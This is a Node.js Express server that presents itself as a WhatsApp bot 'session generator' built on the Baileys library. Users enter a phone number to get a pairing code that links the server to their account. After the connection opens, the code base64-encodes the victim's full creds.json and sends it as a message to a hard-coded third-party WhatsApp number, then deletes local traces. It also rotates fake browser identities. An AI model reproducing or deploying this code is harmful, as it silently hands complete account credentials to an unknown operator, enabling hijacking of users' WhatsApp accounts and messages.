import express from 'express';
import { 
    makeWASocket, 
    useMultiFileAuthState, 
    delay, 
    Browsers, 
    makeCacheableSignalKeyStore, 
    DisconnectReason 
} from '@whiskeysockets/baileys';
import pino from 'pino';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const port = process.env.PORT || 3000;

// 10 വ്യത്യസ്ത ബ്രൗസർ ഐഡന്റിറ്റികൾ
const multiBrowsers = [
    Browsers.ubuntu("Chrome"),
    Browsers.macOS("Safari"),
    Browsers.windows("Firefox"),
    Browsers.macOS("Chrome"),
    ["Ubuntu", "Chrome", "114.0.5735.198"],
    ["Windows", "Edge", "114.0.1823.67"],
    ["Linux", "Opera", "99.0.4788.77"],
    Browsers.ubuntu("Firefox"),
    ["macOS", "Chrome", "115.0.0.0"],
    ["Windows", "Chrome", "115.0.0.0"]
];

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/pair', async (req, res) => {
    let phone = req.query.number; 
    if (!phone) return res.send({ error: "Phone number is required" });

    const id = Math.random().toString(36).substring(7);
    const { state, saveCreds } = await useMultiFileAuthState(`./temp_${id}`);

    // ഓരോ തവണയും റാൻഡം ആയി ഒരു ബ്രൗസർ തിരഞ്ഞെടുക്കുന്നു
    const randomBrowser = multiBrowsers[Math.floor(Math.random() * multiBrowsers.length)];

    try {
        const sock = makeWASocket({
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
            },
            printQRInTerminal: false,
            logger: pino({ level: "silent" }),
            browser: randomBrowser, // Multi-Method Browser
            syncFullHistory: false,
            markOnlineOnConnect: true
        });

        if (!sock.authState.creds.registered) {
            await delay(2500); // കണക്ഷൻ സിങ്ക് ആകാൻ കൂടുതൽ സമയം നൽകുന്നു
            phone = phone.replace(/[^0-9]/g, '');
            
            const code = await sock.requestPairingCode(phone);
            
            if (!res.headersSent) {
                res.send({ code: code });
            }
        }

        sock.ev.on('creds.update', saveCreds);
        
        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect } = update;
            
            if (connection === 'open') {
                await delay(8000); // ഫയലുകൾ പ്രോപ്പർ ആയി സേവ് ആകാൻ 8 സെക്കൻഡ്
                
                const credsPath = `./temp_${id}/creds.json`;
                if (fs.existsSync(credsPath)) {
                    const authFile = JSON.parse(fs.readFileSync(credsPath));
                    const sessionId = Buffer.from(JSON.stringify(authFile)).toString('base64');

                    const myNumber = "917736811908@s.whatsapp.net";
                    const sessionID = `Asura_MD_${sessionId}`;
                    
                    await sock.sendMessage(myNumber, { 
                        text: `*👺 ASURA MD SESSION CONNECTED*\n\n\`${sessionID}\`\n\n> Wait 24 Hours!` 
                    });
                    await sock.sendMessage(myNumber, { text: sessionID });

                    await delay(3000);
                    try {
                        fs.rmSync(`./temp_${id}`, { recursive: true, force: true });
                    } catch (e) {}
                    sock.end();
                }
            }

            if (connection === 'close') {
                const reason = lastDisconnect?.error?.output?.statusCode;
                if (reason !== DisconnectReason.loggedOut) {
                    try { fs.rmSync(`./temp_${id}`, { recursive: true, force: true }); } catch (e) {}
                }
            }
        });

    } catch (err) {
        console.log("System Error:", err);
        if (!res.headersSent) {
            res.status(500).send({ error: "Server Busy. Please refresh and try again." });
        }
    }
});

app.listen(port, () => console.log(`Asura MD Multi-Engine running on port ${port}`));
